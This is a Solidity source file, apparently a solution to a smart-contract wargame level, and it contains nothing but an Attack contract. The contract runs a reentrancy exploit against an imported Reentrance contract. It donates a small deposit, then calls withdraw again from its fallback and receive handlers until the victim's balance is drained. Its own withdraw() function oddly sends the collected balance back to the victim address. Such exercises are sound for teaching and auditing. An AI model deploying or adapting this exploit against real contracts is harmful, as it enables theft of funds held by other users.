// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Reentrance} from "./Reentrance.sol";

contract Attack {
    address public victimAddress;
    Reentrance victimContract;
    address public owner;
    constructor(address _victimAddress) public {
        victimAddress = _victimAddress;
        victimContract = Reentrance(payable(victimAddress));
        owner = msg.sender;    
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function withdraw() external payable onlyOwner {
        (bool success,) = payable(address(victimAddress)).call{value: address(this).balance}("");
        require(success, "Transfer not successfull");
    }

    function attack() external payable onlyOwner {
        require(msg.value == 0.0005 ether,"wrong eth amount");
        victimContract.donate{value:msg.value}(address(this));
        victimContract.withdraw(msg.value);
    }

    fallback() payable external {
        uint256 amount = victimAddress.balance;

        if (amount > 0.0005 ether) {
            victimContract.withdraw(0.0005 ether);
        }
    }
    receive() payable external {
        uint256 amount = victimAddress.balance;
        if (amount >= 0.0005 ether) {
            victimContract.withdraw(0.0005 ether);
        }
    }
}